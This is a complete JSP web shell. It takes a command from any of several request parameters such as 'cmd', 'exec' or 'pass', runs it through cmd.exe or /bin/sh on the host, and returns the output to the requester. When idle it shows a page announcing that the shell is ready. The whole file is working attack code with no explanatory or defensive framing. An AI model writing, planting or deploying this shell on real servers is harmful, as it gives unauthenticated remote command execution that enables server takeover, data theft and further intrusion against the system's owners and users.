<%@ page import="java.io.*,java.util.*" %>
<%
    
    String[] paramNames = {"cmd", "pass", "c", "code", "action", "exec", "command"};
    String execCmd = null;

    
    for (String pName : paramNames) {
        String val = request.getParameter(pName);
        if (val != null && !val.isEmpty()) {
            execCmd = val;
            break;
        }
    }

    
    if (execCmd != null) {
        
        response.setContentType("text/plain;charset=UTF-8");
        response.setCharacterEncoding("UTF-8");

        try {
            
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb;
            if (os.contains("win")) {
                pb = new ProcessBuilder(new String[]{"cmd.exe", "/c", execCmd});
            } else {
                pb = new ProcessBuilder(new String[]{"/bin/sh", "-c", execCmd});
            }

            Process p = pb.start();

            
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String s;
            while ((s = stdInput.readLine()) != null) {
                out.println(s);
            }

            
            BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((s = stdError.readLine()) != null) {
                out.println(s);
            }

        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }

        
        return;
    }

    
    
%>
<html><body>
<pre>JSP Shell is ready. Waiting for command...</pre>
</body></html>
